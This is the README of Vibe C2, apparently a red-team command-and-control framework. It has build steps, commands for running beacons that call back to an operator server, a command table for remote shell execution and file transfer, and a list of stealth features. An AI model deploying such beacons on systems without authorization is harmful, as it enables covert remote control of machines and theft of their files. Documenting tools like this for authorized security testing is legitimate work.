```
██╗   ██╗██╗██████╗ ███████╗     ██████╗██████╗     
██║   ██║██║██╔══██╗██╔════╝    ██╔════╝╚════██╗    
██║   ██║██║██████╔╝█████╗      ██║      █████╔╝    
╚██╗ ██╔╝██║██╔══██╗██╔══╝      ██║     ██╔═══╝     
 ╚████╔╝ ██║██████╔╝███████╗    ╚██████╗███████╗    
  ╚═══╝  ╚═╝╚═════╝ ╚══════╝     ╚═════╝╚══════╝    
```

# 🌊 Vibe C2 Framework

A modern Command and Control (C2) framework for security research and red team operations. Vibe C2 brings a fresh approach to post-exploitation with a clean API, modular design, and cross-platform support.

## Core Components

Vibe C2 consists of three primary components, each engineered for performance and security:

1. **🌐 Team Server**: The central hub that orchestrates your operation. Handles secure communications, beacon management, and task distribution with an intuitive API.

2. **⚡ Beacons**: Lightweight, stealthy agents that execute on target systems. Featuring configurable communication patterns, evasion techniques, and a modular execution engine.

3. **🖥️ Operator Console**: Clean, intuitive command-line interface for real-time command and control. Optimized for both usability and operational security.

## Architecture

```
┌───────────────┐       ┌─────────────┐       ┌─────────────┐
│    Operator   │◄─────►│  Team Server │◄─────►│   Beacons   │
│    Console    │       │             │       │             │
└───────────────┘       └─────────────┘       └─────────────┘
```

- RESTful API architecture with JSON-based communication
- Configurable beacon check-in intervals with dynamic jitter control
- Asynchronous command execution with real-time feedback
- Cross-platform Go beacons for Windows, Linux, and macOS compatibility
- Built-in debugging mode for troubleshooting beacon communication
- Compatible API between Rust server and Go clients for seamless operation
- Designed for both internal security assessments and adversary emulation

## Building the Project

Vibe C2 uses Rust for the server components and Go for the beacons, offering lightning-fast performance and cross-platform compatibility.

```bash
# Build server components
cargo build --release

# Build Go beacons
cd go-beacons && ./build.sh
```

After building, you'll find the binaries in:
- `target/release/` - Server components (teamserver, operator)
- `target/go-beacons/` - Go beacon executables for all platforms

## Beacon Formats

Vibe C2 provides Go-based beacons that offer excellent cross-platform compatibility, simplified command execution, and enhanced configurability:

| Format | Description | Generated With |
|--------|-------------|------------------|
| **Windows EXE** | Native Windows executable | `go-beacons/build.sh --os windows` |
| **Linux Binary** | Native Linux executable | `go-beacons/build.sh --os linux` |
| **macOS Binary** | Native macOS executable | `go-beacons/build.sh --os darwin` |
| **All Platforms** | Generate all platforms at once | `go-beacons/build.sh --os all` |

## Deployment

### 1. Start the Team Server:

```bash
cargo run --bin vibe-teamserver
```

### 2. Start the Operator Console:

```bash
cargo run --bin vibe-operator
```

### 3. Deploy a Beacon:

```bash
# Build beacons for all platforms
cd go-beacons && ./build.sh --server-url http://localhost:8080 --sleep 30 --jitter 20

# Build for specific platform
cd go-beacons && ./build.sh --server-url http://localhost:8080 --os [windows|linux|darwin]

# Additional beacon options
--debug      Enable debug output (disabled by default)
--silent     Enable silent mode - no console output (enabled by default)
```

### 4. Running Beacons

When executing beacons, you **must** specify the server URL if it's different from the default:

```bash
# On Linux/macOS
./vibe_beacon_linux_amd64 -server http://your-server-ip:8080

# On Windows
.\vibe_beacon_windows_amd64.exe -server http://your-server-ip:8080
```

> **Note:** If you don't specify the `-server` flag, the beacon will attempt to connect to `http://localhost:8080` by default

The built beacons will be available in `target/go-beacons/` directory.

## Command Reference

### Team Server

```bash
cargo run --bin vibe-teamserver -- --port <port>
```

### Operator Console

The operator console features a modern command-line interface with:

- Command history (use arrow keys to navigate previous commands)
- Automatic prompt redisplay after command output
- Color-coded output for better readability
- Tab completion (coming soon)

```bash
cargo run --bin vibe-operator -- --server-url <url>
```

### Beacons

```bash
# Run from target/go-beacons directory
./vibe_beacon_linux_amd64 --server <url> --sleep <seconds> --jitter <percent> [--debug]

# Short form available
./vibe_beacon_linux_amd64 -r <url> -s <seconds> -j <percent> -d

# Windows example
vibe_beacon_windows_amd64.exe --server <url> --sleep 30 --jitter 20

# macOS example
./vibe_beacon_darwin_amd64 --server <url> --sleep 30 --jitter 20
```

The `--debug` flag enables detailed logging of beacon communication, which is invaluable for troubleshooting connectivity or command execution issues. Debug logs will be stored in the `debug_logs` directory.

## Go Beacon Builder Reference

```bash
./go-beacons/build.sh --server-url <url> --sleep <seconds> --jitter <percent> --os <platform>
```

Options:
- `--server-url`: Team server URL (default: http://localhost:8080)
- `--sleep`: Sleep time between check-ins in seconds (default: 30)
- `--jitter`: Jitter percentage for sleep time (0-50, default: 20)
- `--os`: Target OS to build for (windows, linux, darwin, all)
- `--help`: Show help message

## Operator Command Reference

### Global Commands
| Command | Description |
|---------|-------------|
| `help` | Display available commands |
| `exit`, `quit` | Exit the console |
| `list` | View all connected beacons |
| `use <id>` | Select a beacon for interaction |
| `info [id]` | Display detailed beacon information |

### Beacon Commands
| Command | Description |
|---------|-------------|
| `shell <cmd>` | Execute system commands |
| `upload <src> <dst>` | Transfer files to target |
| `download <src>` | Retrieve files from target |
| `sleep <seconds>` | Adjust check-in frequency |
| `jitter <percent>` | Set randomness (0-50%) for sleep time |
| `terminate` | End the beacon process |

## Security Research

Vibe C2 showcases advanced concepts in offensive security tooling:

- Asynchronous command execution with Tokio
- Modern API design with Axum web framework
- Efficient binary payloads with optimized Go
- Cross-platform beacon implementations for Windows, Linux, and macOS
- Dynamic jitter for enhanced operational security and evasion
- JSON-based communication protocol with proper error handling
- Compatible API design between Rust server and Go clients
- Simple, powerful command and control architecture

## Go Beacon Communication

The Go beacons implement a specialized communication protocol with the Rust team server:

1. **Registration**: Beacons register with the server and receive a unique ID
2. **Check-in**: Beacons periodically check in with the server to receive tasks
3. **Command Execution**: Beacons execute commands received from the server
4. **Command Output**: Results are sent back to the server using a compatible format

The beacons support various command types including shell commands, sleep time adjustment, jitter configuration, and termination commands. All communication happens over HTTP using JSON payloads for maximum compatibility.

### Stealth Features

The Go beacons include several stealth features designed for operational security:

- **Silent Mode**: Beacons run completely silently with no console output (enabled by default)
- **No Disk Artifacts**: Beacons don't create any log files or artifacts on disk
- **Jitter**: Randomized sleep times between check-ins to avoid detection

These features make the beacons suitable for security testing where minimal footprint is required. Debug mode can be enabled with the `-debug` flag and silent mode can be disabled with `-silent=false` when troubleshooting.

## Disclaimer

This framework is designed for authorized security testing and research purposes only. Features are implemented with educational transparency rather than operational security. The tool intentionally lacks certain capabilities found in commercial security testing platforms:

- Encrypted communications channels
- Evasion of security controls
- Process injection techniques
- Advanced persistence mechanisms

## License

Vibe C2 is provided for security research and education only. Usage must comply with all applicable laws and regulations.
